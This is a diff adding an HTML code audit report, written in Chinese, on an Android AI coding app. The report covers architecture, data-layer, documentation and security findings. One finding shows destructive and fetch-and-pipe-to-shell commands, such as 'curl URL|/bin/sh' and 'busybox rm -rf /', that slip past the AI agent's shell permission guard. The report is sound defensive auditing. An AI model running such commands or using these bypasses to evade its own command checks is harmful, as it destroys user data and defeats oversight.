@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MiniMe-core 代码审计报告</title>
+<style>
+:root{
+  --bg:#0f1419; --panel:#1a2029; --panel2:#222b36; --ink:#e6edf3; --muted:#9aa7b4;
+  --line:#2d3742; --accent:#4ea1ff;
+  --sev-critical:#c0392b; --sev-high:#e67e22; --sev-mid:#d4a017; --sev-low:#5b7fa6; --sev-tip:#2e8b57;
+  --type-defect:#e74c3c; --type-risk:#f39c12; --type-choice:#16a085;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,"Segoe UI","PingFang SC","Microsoft YaHei",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:1.65}
+a{color:var(--accent);text-decoration:none}
+/* layout */
+#sidebar{position:fixed;top:0;left:0;width:264px;height:100vh;overflow-y:auto;background:var(--panel);border-right:1px solid var(--line);padding:18px 14px;z-index:50}
+#sidebar h2{font-size:15px;margin:0 0 12px;color:#fff}
+#sidebar .grp{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin:14px 0 4px}
+#sidebar a{display:block;padding:5px 8px;border-radius:6px;color:var(--muted);font-size:13px}
+#sidebar a:hover{background:var(--panel2);color:var(--ink)}
+#sidebar a.active{background:#243447;color:#fff}
+#main{margin-left:264px;padding:28px 36px 80px;max-width:1180px}
+#menuBtn{display:none;position:fixed;top:12px;left:12px;z-index:60;background:var(--panel2);color:#fff;border:1px solid var(--line);border-radius:8px;padding:8px 12px;cursor:pointer}
+h1{font-size:24px;margin:0 0 4px}
+h2.sec{font-size:20px;margin:42px 0 14px;padding-bottom:8px;border-bottom:2px solid var(--line);color:#fff}
+h3{font-size:16px;margin:26px 0 10px;color:#cfe3ff}
+.sub{color:var(--muted);margin:0 0 18px}
+/* badges */
+.badge{display:inline-block;padding:1px 8px;border-radius:10px;font-size:11px;font-weight:600;color:#fff;white-space:nowrap}
+.b-critical{background:var(--sev-critical)} .b-high{background:var(--sev-high)}
+.b-mid{background:var(--sev-mid)} .b-low{background:var(--sev-low)} .b-tip{background:var(--sev-tip)}
+.t-defect{background:rgba(231,76,60,.16);color:#ff8a7a;border:1px solid rgba(231,76,60,.5)}
+.t-risk{background:rgba(243,156,18,.14);color:#ffcf6b;border:1px solid rgba(243,156,18,.5)}
+.t-choice{background:rgba(22,160,133,.14);color:#6fe0c4;border:1px solid rgba(22,160,133,.5)}
+/* cards */
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:12px 0}
+.card .ct{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin-bottom:6px}
+.card .ct .cid{font-weight:700;color:#fff}
+.card .meta{color:var(--muted);font-size:12.5px;margin:3px 0}
+.card .meta b{color:#bcd}
+.card p{margin:6px 0}
+.lbl{color:#8fd0ff;font-weight:600}
+/* score table */
+table{border-collapse:collapse;width:100%;margin:10px 0;font-size:13px}
+th,td{border:1px solid var(--line);padding:6px 9px;text-align:left;vertical-align:top}
+th{background:var(--panel2);color:#fff}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.scorecell{font-weight:700}
+/* code */
+pre{background:#0b0f14;border:1px solid var(--line);border-radius:8px;padding:10px 12px;overflow-x:auto;font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;font-size:12.5px;line-height:1.5}
+code{font-family:inherit}
+.path{font-family:"SFMono-Regular",Consolas,Menlo,monospace;font-size:12px;color:#9ad}
+/* filter */
+.filters{margin:10px 0}
+.filters button{background:var(--panel2);color:var(--muted);border:1px solid var(--line);border-radius:16px;padding:4px 13px;margin:0 4px 6px 0;cursor:pointer;font-size:12.5px}
+.filters button.on{background:var(--accent);color:#06121f;border-color:var(--accent);font-weight:700}
+.summarygrid{display:flex;flex-wrap:wrap;gap:12px;margin:14px 0}
+.stat{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 18px;min-width:110px;text-align:center}
+.stat .n{font-size:26px;font-weight:800}
+.stat .l{font-size:12px;color:var(--muted)}
+.road{border-left:3px solid var(--accent);padding:4px 0 4px 14px;margin:10px 0}
+.p0{border-left-color:var(--sev-critical)} .p1{border-left-color:var(--sev-high)} .p2{border-left-color:var(--sev-mid)}
+ul.tight{margin:6px 0;padding-left:22px} ul.tight li{margin:3px 0}
+.foot{margin-top:50px;padding-top:18px;border-top:1px solid var(--line);color:var(--muted);font-size:12.5px}
+svg{max-width:100%;height:auto;background:#0b0f14;border:1px solid var(--line);border-radius:10px}
+@media(max-width:900px){
+  #sidebar{transform:translateX(-100%);transition:.2s;width:250px}
+  #sidebar.open{transform:translateX(0)}
+  #main{margin-left:0;padding:60px 16px 60px}
+  #menuBtn{display:block}
+}
+</style>
+</head>
+<body>
+<button id="menuBtn">☰ 目录</button>
+<nav id="sidebar">
+  <h2>MiniMe-core 审计报告</h2>
+  <div class="grp">总览</div>
+  <a href="#summary">① 执行摘要与评分</a>
+  <a href="#topissues">最严重问题 Top 列表</a>
+  <a href="#arch">② 架构与数据流图</a>
+  <div class="grp">逐层发现</div>
+  <a href="#c-arch">③ 架构 / 数据层 / 文档</a>
+  <a href="#c-agent">④ AI Agent 核心</a>
+  <a href="#c-sec">⑤ 安全专项</a>
+  <a href="#c-term">⑥ 终端 / 容器 / newui</a>
+  <a href="#c-build">⑦ 构建 / 并发 / 合规</a>
+  <div class="grp">结论</div>
+  <a href="#highlights">⑧ 亮点与设计取舍</a>
+  <a href="#master">⑨ 问题清单总表</a>
+  <a href="#roadmap">⑩ 整改路线图</a>
+</nav>
+
+<div id="main">
+
+<h1>MiniMe-core 代码审计报告</h1>
+<p class="sub">对象：<span class="path">github.com/Lisir2002/MiniMe-core</span>　·　类型：Android AI 编程工具（PRoot Alpine + Termux 派生终端 + AI Agent + MCP + Git + 远程 SSH + 代理 + 检查点）　·　技术栈：Kotlin + Jetpack Compose / Hilt / SQLDelight / minSdk 26　·　许可证 GPL-3.0</p>
+<p class="sub">审计方法：人工读码 + grep 实证扫描（未编译 APK、未真机运行、未做动态/渗透测试）。生成日期：2026-09-19。</p>
+
+<!-- ============ 执行摘要 ============ -->
+<h2 class="sec" id="summary">① 执行摘要与总体评分</h2>
+<p>MiniMe-core 是一个工程完成度较高的 Android 端 AI 编程工具：4 个 Gradle 模块、约 14.9 万行代码，内置 PRoot Alpine 容器与 Termux 派生终端，并封装了 Anthropic/OpenAI/Gemini 三 provider、MCP 客户端、Git 集成、远程 SSH 与文件检查点回滚。整体设计思路清晰（Reducer+SideEffect 状态机、设计 token 流水线、迁移快照安全网、CI 工程化），但存在<strong>一处必须立即处置的供应链级严重问题</strong>（Release 签名私钥与明文密码已入库公开仓库），以及<strong>权限/命令护栏在 AUTO 模式下多条可复现绕过</strong>、<strong>文档对外宣称的 SQLCipher 加密实际未接线</strong>、若干 God Object 与边界违例。</p>
+
+<div class="summarygrid">
+  <div class="stat"><div class="n" style="color:#fff">6.6</div><div class="l">总体评分 /10</div></div>
+  <div class="stat"><div class="n" style="color:var(--sev-critical)">1</div><div class="l">严重</div></div>
+  <div class="stat"><div class="n" style="color:var(--sev-high)">12</div><div class="l">高</div></div>
+  <div class="stat"><div class="n" style="color:var(--sev-mid)">30</div><div class="l">中</div></div>
+  <div class="stat"><div class="n" style="color:var(--sev-low)">21</div><div class="l">低</div></div>
+  <div class="stat"><div class="n" style="color:var(--sev-tip)">3</div><div class="l">提示</div></div>
+  <div class="stat"><div class="n" style="color:#fff">67</div><div class="l">问题总数</div></div>
+</div>
+<p class="sub">说明：问题总数 67 与专项摸底一致；按严重度复核为 严重1 / 高12 / 中30 / 低21 / 提示3（专项底稿中两条“提示”级设计取舍并入中/低复核，合计仍为 67）。覆盖模块：4 个 Gradle 模块（:app、:newui、:terminal-emulator、:terminal-view）+ :app 内 core/datalayer/di/feature（11 个 feature）。</p>
+
+<h3>分维度评分</h3>
+<table>
+<thead><tr><th>维度</th><th>评分</th><th>一句话依据</th></tr></thead>
+<tbody>
+<tr><td>总体架构合理性</td><td class="scorecell">6.0</td><td>多模块方向正确，但 :app 内 core↔feature 包级循环依赖、domain 直连 datalayer</td></tr>
+<tr><td>数据层</td><td class="scorecell">6.5</td><td>SQLDelight 六库 + 迁移快照/自愈扎实；CodeMigration 死代码、自愈仅覆盖 2/27 表</td></tr>
+<tr><td>文档一致性</td><td class="scorecell">4.0</td><td>中英文 README 互相矛盾；SQLCipher 谎称已启用；多处指向不存在文件</td></tr>
+<tr><td>feature 内聚</td><td class="scorecell">6.5</td><td>多数三段式落地；t2i 无 presentation、git/proxy 缺 data 层</td></tr>
+<tr><td>Agent 状态机</td><td class="scorecell">8.0</td><td>50 轮硬顶 + 续写/空转/LoopGuard 多级熔断，取消语义干净</td></tr>
+<tr><td>工具系统</td><td class="scorecell">8.0</td><td>AgentTool 抽象/能力模型/错误分类/重试完备；缺入参运行时校验</td></tr>
+<tr><td>LLM 抽象与流式</td><td class="scorecell">7.0</td><td>统一接口、SSE 容错扎实；并行工具 index≥2 静默丢弃、首 token 后不重试未接线</td></tr>
+<tr><td>上下文压缩</td><td class="scorecell">7.0</td><td>90% 触发 + 锚定摘要 + head/tail 配对；token 为字符估算</td></tr>
+<tr><td>MCP 客户端</td><td class="scorecell">8.0</td><td>stdio/HTTP 双 transport、按 server 隔离、pending 路由完备；无运行期重连</td></tr>
+<tr><td>PLAN/BUILD/AUTO 三模式</td><td class="scorecell">8.0</td><td>PLAN 只读在策略层真实拦截；AUTO 近乎全放行</td></tr>
+<tr><td>God Object 程度</td><td class="scorecell">4.0</td><td>2228/2110/1995 行三大文件职责严重过载</td></tr>
+<tr><td>权限引擎可靠性</td><td class="scorecell">5.0</td><td>分层评估克制，但 AUTO 下静态护栏多条可复现绕过</td></tr>
+<tr><td>凭据存储</td><td class="scorecell">7.0</td><td>Keystore→DEK→AES-256-GCM 双层加密优秀；git-credentials 明文落盘</td></tr>
+<tr><td>密钥泄漏防护</td><td class="scorecell">6.0</td><td>无硬编码 key/TrustAll；但完整 agent shell 命令写入公共外部日志</td></tr>
+<tr><td>TLS / 网络</td><td class="scorecell">7.0</td><td>无 TrustAll；全局 cleartextTrafficPermitted=true</td></tr>
+<tr><td>SSH 主机校验</td><td class="scorecell">8.0</td><td>真 TOFU + known_hosts + 变更即抛；首连静默接受</td></tr>
+<tr><td>容器隔离</td><td class="scorecell">7.0</td><td>PRoot 伪 root 仍为 App UID、绑定最小化；共享存储为可选开关</td></tr>
+<tr><td>WebView</td><td class="scorecell">5.0</td><td>无 addJavascriptInterface；JS+allowFileAccess+混合内容全开</td></tr>
+<tr><td>可执行扩展资产</td><td class="scorecell">7.0</td><td>assets/ext 极简（hooks 仅 log）；风险集中在容器内可写 PATH</td></tr>
+<tr><td>容器生命周期</td><td class="scorecell">6.5</td><td>看门狗/finally 回收扎实；reset 在活容器上删 rootfs、只杀直接子进程</td></tr>
+<tr><td>bundle 安装</td><td class="scorecell">8.0</td><td>真断点续传、apk exit=2 自愈、并行预取失败即停</td></tr>
+<tr><td>Termux 改动维护性</td><td class="scorecell">7.5</td><td>近原样 vendored，仅抽 SessionBackend；改动面小、有署名</td></tr>
+<tr><td>native .so</td><td class="scorecell">5.0</td><td>四 ABI 齐全，但 stripped 预编译、无 C 源码/构建脚本/上游 commit</td></tr>
+<tr><td>终端多标签/后台常驻</td><td class="scorecell">8.0</td><td>Singleton 会话池 + 竞态修复 + 前台保活；会话仅内存态</td></tr>
+<tr><td>newui token 体系</td><td class="scorecell">9.0</td><td>真 Style Dictionary 流水线 + CI 对账门禁，库内 0 硬编码色值</td></tr>
+<tr><td>newui 组件库</td><td class="scorecell">8.5</td><td>90 组件 + 8 primitive + 10 layout，截图金标齐全</td></tr>
+<tr><td>newui 解耦度</td><td class="scorecell">6.5</td><td>依赖方向干净；但 app 仍跑旧 AIEditorTheme、未真正切换</td></tr>
+<tr><td>构建可维护性</td><td class="scorecell">5.0</td><td>无 version catalog，版本全部内联；branding 单一事实源良好</td></tr>
+<tr><td>版本 / 签名 / R8</td><td class="scorecell">3.0</td><td><b>签名私钥+明文密码入库（严重）</b>；无 git tag；R8 规则详尽</td></tr>
+<tr><td>测试覆盖</td><td class="scorecell">6.0</td><td>app 386 个 @Test；androidTest=0、terminal 模块=0、三大文件无测试</td></tr>
+<tr><td>CI</td><td class="scorecell">8.0</td><td>6 个 workflow + OSV 扫描 + versionCode 单调性校验</td></tr>
+<tr><td>并发与资源</td><td class="scorecell">7.0</td><td>零 GlobalScope、SSH/PTY 释放到位；runBlocking 同步桥接</td></tr>
+<tr><td>合规与隐私</td><td class="scorecell">4.0</td><td>GPL LICENSE 完整；Termux 无版权头、二进制资产无归属、无隐私政策</td></tr>
+</tbody>
+</table>
+
+<!-- Top issues -->
+<h2 class="sec" id="topissues">最严重问题 Top 列表</h2>
+<div class="card"><div class="ct"><span class="badge b-critical">严重</span><span class="badge t-defect">已验证缺陷</span><span class="cid">BLD-01</span><span>Release 签名密钥与明文密码提交进公开仓库</span></div>
+<p><span class="path">app/minime.jks</span>（git tracked）+ <span class="path">app/keystore.properties</span> 含明文 <span class="path">storePassword/keyPassword=9d4d…ab893</span>。任何 clone 仓库者都可用官方密钥签发恶意 APK 冒充官方签名。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">SEC-01 / SEC-02</span><span>AUTO 模式 shell 护栏可绕过</span></div>
+<p><span class="path">ShellCommandParser.kt:162</span> 只认 <span class="path">rm</span> 结尾，<code>busybox rm -rf /</code> 不被识别；<span class="path">ToolPermissionPolicyEngine.kt:112-126</span> 不看 <code>analyzable</code>，<code>eval "$(curl URL)"</code>、<code>curl URL|/bin/sh</code>、<code>rm -rf /.</code> 均被放行。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-10</span><span>文档谎称 SQLCipher 已启用，实际明文库</span></div>
+<p><span class="path">README.md:150 / AGENTS.md:48,237</span> 宣称“SQLCipher 加密读写”，但 <span class="path">CipherDriverFactory.kt:22</span> 直接 <code>error("尚未启用")</code>，<span class="path">DataLayerModule.kt:64-67</span> 绑定的是 <code>PlainDriverFactory</code>——对外安全能力不实陈述。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-01</span><span>core/security 与 feature/workspace 包级循环依赖</span></div>
+<p><span class="path">core/security/CredentialEncryptor.kt:7</span> 反向 import <span class="path">feature.workspace.domain.*</span>，而 <span class="path">feature/workspace/domain/repository/RemoteRepository.kt:3</span> 又 import core.security——最底层 core 被架空依赖。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-11</span><span>英文 README 仍描述旧 Room 架构</span></div>
+<p><span class="path">README.en.md:150</span> 写 “Room 2.7.1 / 5 DBs”，与代码（无 Room 依赖、实际 6 个 SQLDelight 库）及中文 README 三方矛盾，英文用户被误导。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">TML-01 / TML-02</span><span>reset 不杀活进程即删 rootfs；全程只杀直接子进程</span></div>
+<p><span class="path">LinuxContainerEngine.kt:905-931</span> 仅 <code>initJob?.cancel()</code> 后直接 <code>deleteRecursively()</code>；所有终止点只杀直接子 pid，无进程组（负 pid）终止，后台派生进程（dev server / MCP 子进程）孤儿化。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">AGT-01</span><span>OpenAI 流式并行工具调用 index≥2 被静默丢弃</span></div>
+<p><span class="path">OpenAIAdapter.kt:36-52</span> 仅注册 <code>tool_calls[0..1]</code> 抽取路径，一次发起 ≥3 个并行工具调用时第 3 个及以后被静默吞掉，模型误判已执行。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-07</span><span>agent 完整 shell 命令写入公共外部日志</span></div>
+<p><span class="path">core/util/FileLogger.kt:35</span> 默认 VERBOSE 写 <span class="path">Documents/MiniMe-core/logs/</span>；<span class="path">LinuxContainerEngine.kt:249</span> 等 7 处把完整命令落盘，内嵌的 token/密码外泄。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-06</span><span>git PAT 明文落盘 files/minime/git-credentials</span></div>
+<p><span class="path">GitCredentialsFileSync.kt:62-67</span> 写出 <code>https://user:token@host</code> 明文，与 Keystore 加密设计不一致；adb/root 可直读。</p></div>
+
+<!-- ============ 架构图 ============ -->
+<h2 class="sec" id="arch">② 架构与数据流图（内联 SVG）</h2>
+<p class="sub">下图为静态结构示意（依据源码核对）：左侧为 Compose UI/feature，向下经 ViewModel → domain → datalayer/repository → SQLDelight 本地六库；右侧为外部依赖（LLM 三 provider、工具/MCP、PRoot 容器+Termux 终端、远程 SSH、Git 旁路）。</p>
+<svg viewBox="0 0 980 640" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system,Segoe UI,PingFang SC,Microsoft YaHei,sans-serif" font-size="12">
+  <defs>
+    <marker id="arr" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0,0 L8,4.5 L0,9 z" fill="#9aa7b4"/></marker>
+  </defs>
+  <rect x="0" y="0" width="980" height="640" fill="#0b0f14"/>
+  <!-- left stack -->
+  <g>
+    <rect x="40" y="30" width="300" height="46" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="190" y="58" fill="#cfe3ff" text-anchor="middle">Compose UI / 11 个 feature (presentation)</text>
+
+    <rect x="40" y="110" width="300" height="46" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="190" y="138" fill="#cfe3ff" text-anchor="middle">ViewModel + StateFlow (AIAgentViewModel …)</text>
+
+    <rect x="40" y="190" width="300" height="46" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="190" y="218" fill="#cfe3ff" text-anchor="middle">domain (workflow / useCase / tool)</text>
+
+    <rect x="40" y="270" width="300" height="46" rx="8" fill="#2a2333" stroke="#f39c12"/>
+    <text x="190" y="298" fill="#ffcf6b" text-anchor="middle">datalayer/repository (AgentRepository…)</text>
+
+    <rect x="40" y="350" width="300" height="46" rx="8" fill="#22332a" stroke="#2e8b57"/>
+    <text x="190" y="378" fill="#6fe0c4" text-anchor="middle">SQLDelight 六库 (Agent/Creds/Settings/Workspace/T2i/Infra)</text>
+
+    <line x1="190" y1="76" x2="190" y2="108" stroke="#9aa7b4" marker-end="url(#arr)"/>
+    <line x1="190" y1="156" x2="190" y2="188" stroke="#9aa7b4" marker-end="url(#arr)"/>
+    <line x1="190" y1="236" x2="190" y2="268" stroke="#9aa7b4" marker-end="url(#arr)"/>
+    <line x1="190" y1="316" x2="190" y2="348" stroke="#9aa7b4" marker-end="url(#arr)"/>
+    <text x="350" y="296" fill="#e74c3c" font-size="11">⚠ domain 直连 datalayer（边界违例）</text>
+  </g>
+  <!-- external boxes -->
+  <g>
+    <rect x="600" y="30" width="340" height="40" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="770" y="55" fill="#cfe3ff" text-anchor="middle">LLM Providers: Anthropic / OpenAI / Gemini (SSE)</text>
+
+    <rect x="600" y="100" width="340" height="40" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="770" y="125" fill="#cfe3ff" text-anchor="middle">AgentTool 工具系统 (27) + MCP stdio/HTTP</text>
+
+    <rect x="600" y="170" width="340" height="46" rx="8" fill="#2a2333" stroke="#e67e22"/>
+    <text x="770" y="198" fill="#ffcf6b" text-anchor="middle">PRoot Alpine 容器 + Termux 终端 (PTY/多标签)</text>
+
+    <rect x="600" y="250" width="340" height="40" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="770" y="275" fill="#cfe3ff" text-anchor="middle">远程 SSH (TOFU known_hosts) / SFTP·FTP</text>
+
+    <rect x="600" y="320" width="340" height="40" rx="8" fill="#1c2a3a" stroke="#4ea1ff"/>
+    <text x="770" y="345" fill="#cfe3ff" text-anchor="middle">Git 集成 (shell 旁路) / mihomo 代理回环</text>
+
+    <rect x="600" y="390" width="340" height="40" rx="8" fill="#22332a" stroke="#2e8b57"/>
+    <text x="770" y="415" fill="#6fe0c4" text-anchor="middle">凭据: Keystore MasterKey→DEK→AES-256-GCM</text>
+  </g>
+  <!-- arrows from domain -->
+  <line x1="340" y1="200" x2="598" y2="50" stroke="#9aa7b4" marker-end="url(#arr)"/>
+  <line x1="340" y1="215" x2="598" y2="120" stroke="#9aa7b4" marker-end="url(#arr)"/>
+  <line x1="340" y1="225" x2="598" y2="193" stroke="#e67e22" stroke-width="1.5" marker-end="url(#arr)"/>
+  <line x1="340" y1="230" x2="598" y2="270" stroke="#9aa7b4" marker-end="url(#arr)"/>
+  <line x1="340" y1="235" x2="598" y2="340" stroke="#9aa7b4" marker-end="url(#arr)"/>
+  <line x1="340" y1="280" x2="598" y2="410" stroke="#2e8b57" marker-end="url(#arr)"/>
+
+  <!-- legend -->
+  <g font-size="11">
+    <rect x="40" y="430" width="14" height="14" fill="#1c2a3a" stroke="#4ea1ff"/><text x="62" y="442" fill="#cfe3ff">应用层/业务</text>
+    <rect x="160" y="430" width="14" height="14" fill="#2a2333" stroke="#f39c12"/><text x="182" y="442" fill="#ffcf6b">有边界违例</text>
+    <rect x="280" y="430" width="14" height="14" fill="#22332a" stroke="#2e8b57"/><text x="302" y="442" fill="#6fe0c4">数据/加密</text>
+  </g>
+  <text x="40" y="480" fill="#9aa7b4" font-size="11">注：Hilt 单例图分两块——di/（网络/工具/工作流/业务 repo）+ datalayer/di/DataLayerModule（L0 引擎/六库/store/repo）。</text>
+  <text x="40" y="500" fill="#9aa7b4" font-size="11">:app 单向依赖 :newui / :terminal-emulator / :terminal-view；真正的分层问题在 :app 内部三包（core/datalayer/feature）未做编译期隔离。</text>
+</svg>
+
+<!-- ============ ③ 架构/数据层/文档 ============ -->
+<h2 class="sec" id="c-arch">③ 架构 / 数据层 / 文档一致性</h2>
+<p class="sub">Gradle 模块方向干净（:app 单向依赖 :newui / 终端两模块），:newui 无业务依赖。真正问题在 :app 内部 core/datalayer/feature 三包未做编译期隔离，靠代码自觉；数据层为纯 SQLDelight（无 Room 混用，目录命名与 KDoc 为 Room 时代遗物）；文档与代码存在多处矛盾。</p>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-01</span><span>core 与 feature.workspace 包级循环依赖</span></div>
+<p class="meta">证据：<span class="path">core/security/CredentialEncryptor.kt:7-9</span> ↔ <span class="path">feature/workspace/domain/repository/RemoteRepository.kt:3-4</span></p>
+<pre><code>// core/security/CredentialEncryptor.kt:7
+import com.mini.me_core.feature.workspace.domain.RemoteAuditAction
+// feature/workspace/domain/repository/RemoteRepository.kt:3
+import com.mini.me_core.core.security.CredentialEncryptor</code></pre>
+<p><span class="lbl">影响：</span>本应最底层的 core 反向依赖具体 feature 并成环；:app 单模块内编译期不报错，但 core 无法脱离 feature 独立复用/测试，Hilt 图被迫双向接线。</p>
+<p><span class="lbl">建议：</span>把 RemoteAuditLogRepository/RemoteAuditAction 下沉为 core/datalayer 抽象，core.security 只依赖接口，workspace 实现后注入。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-02</span><span>feature/domain 直连 datalayer（绕过 feature/data）</span></div>
+<p class="meta">证据：23 个 domain 文件 import datalayer，如 <span class="path">feature/agent/domain/session/SessionUseCase.kt:4</span></p>
+<p><span class="lbl">影响：</span>domain 直接持有 926 行 AgentRepository，与 SQLDelight 实现耦合，feature/data 层在 agent 域被架空。</p>
+<p><span class="lbl">建议：</span>domain 依赖抽象接口，feature/data 适配器实现并委托 V2；至少把“domain 直连 datalayer”列入代码红线。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-03</span><span>presentation 直连 SQLDelight 生成类型</span></div>
+<p class="meta">证据：<span class="path">feature/agent/presentation/AIAgentViewModel.kt:9-12</span> import <span class="path">datalayer.sqldelight.agent.Agent_message</span> 等</p>
+<p><span class="lbl">影响：</span>ViewModel 直接消费生成的数据类，UI 随 schema 漂移。<span class="lbl">建议：</span>经 domain state/UI model 中转。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-04</span><span>CodeMigration 迁移通道是死代码</span></div>
+<p class="meta">证据：<span class="path">datalayer/migration/CodeMigration.kt:12</span> 定义后全仓无实例化；<span class="path">DataLayerModule.kt:165</span> 六个 provide*Db 均 <code>ensureSchema(...)</code> 不传 codeMigrations。</p>
+<p><span class="lbl">影响：</span>“DDL 走 .sqm、行重组走 CodeMigration”双通道设计，代码迁移通道从未接线。<span class="lbl">建议：</span>显式组装 List&lt;CodeMigration&gt; 或删除参数以减误导。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-risk">设计风险</span><span class="cid">ARC-05</span><span>SchemaSelfHealer 只自愈 2/27 张表</span></div>
+<p class="meta">证据：<span class="path">datalayer/migration/SchemaSelfHealer.kt:30-82</span> 硬编码 agent_message/agent_session；<span class="path">DataLayerModule.kt:131</span> 仅 AGENT 库调用；agent.sq 共 27 张表。</p>
+<p><span class="lbl">影响：</span>其余 25 张表若出现“版本号对齐但缺列”的历史漂移仍会首查即崩。<span class="lbl">建议：</span>healer 泛化为遍历 .sq 全部表做列对账。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">ARC-06</span><span>自愈器硬编码 DDL，与 .sq 双份真相</span></div>
+<p class="meta">证据：<span class="path">SchemaSelfHealer.kt:42-73</span> 内嵌与 agent.sq 重复的 CREATE TABLE DDL。</p>
+<p><span class="lbl">影响：</span>改列若忘记同步硬编码，自愈会把表“重建到旧结构”。<span class="lbl">建议：</span>从 SQLDelight 生成的 schema 元数据读列。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-tip">提示</span><span class="badge t-choice">设计取舍</span><span class="cid">ARC-07</span><span>迁移快照生成但无“连续失败→回滚”闭环</span></div>
+<p class="meta">证据：<span class="path">MigrationEngine.kt:131-172</span> 有快照/restoreSnapshot；<span class="path">DataLayerModule.kt:107-109</span> 对失败一律 runCatching 忽略。</p>
+<p><span class="lbl">影响：</span>快照备而不用。<span class="lbl">建议：</span>补失败计数看门狗，连续失败后自动 restoreSnapshot。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">ARC-08</span><span>BackupManagerImpl（961 行）三向映射冗余</span></div>
+<p class="meta">证据：<span class="path">feature/backup/data/BackupManagerImpl.kt:865-918</span> 维护 V2AgentSession↔ChatSessionEntity↔ChatSessionDto 三套互转。</p>
+<p><span class="lbl">影响：</span>schema 加列要改三处，漏一处即备份丢列。<span class="lbl">建议：</span>收敛为 V2↔Dto 直接映射，删 Entity 中转。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">ARC-09</span><span>AgentRepository（926 行/225 fun）是 god-class</span></div>
+<p class="meta">证据：<span class="path">datalayer/repository/AgentRepository.kt:22</span> 单类聚合 agent 域几乎所有读写；WakeQueueStore 接口被别名注入（<span class="path">DataLayerModule.kt:233</span>）形同虚设。</p>
+<p><span class="lbl">建议：</span>按子域拆成 Session/Goal/Job 等仓储，domain 依赖各自抽象。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-10</span><span>文档宣称 SQLCipher 加密读写，实际明文库</span></div>
+<p class="meta">证据：<span class="path">README.md:150</span>、<span class="path">AGENTS.md:48,237</span>；代码 <span class="path">datalayer/engine/CipherDriverFactory.kt:22</span> 直接 error，<span class="path">DataLayerModule.kt:64-67</span> 绑 PlainDriverFactory。</p>
+<pre><code>override fun create(lib: LibName): SqlDriver {
+    error("CipherDriverFactory 尚未启用：请先引入 net.zetetic:android-database-sqlcipher …")
+}</code></pre>
+<p><span class="lbl">影响：</span>对外安全能力不实陈述，磁盘库为明文（仅字段级 AES-GCM）。<span class="lbl">建议：</span>文档改为“SQLCipher 预留接缝 + 字段级加密”。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-11</span><span>英文 README 仍写旧 Room 架构</span></div>
+<p class="meta">证据：<span class="path">README.en.md:150</span> “Room 2.7.1 / 5 DBs” vs 代码无 Room、实际 6 库 SQLDelight。</p>
+<p><span class="lbl">建议：</span>把 EN README 数据库行同步为 SQLDelight 6 库现状。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-12</span><span>文档指向不存在的源文件</span></div>
+<p class="meta">证据：<span class="path">README.md:165</span>/<span class="path">AGENTS.md:189,245,273</span> 称存在 <span class="path">db/MigrationLoader.kt</span>、<span class="path">core/db/V1toV2FullMigrator.kt</span>，实际均不存在。</p>
+<p><span class="lbl">建议：</span>删除/修正这两条路径。</p></div>
+
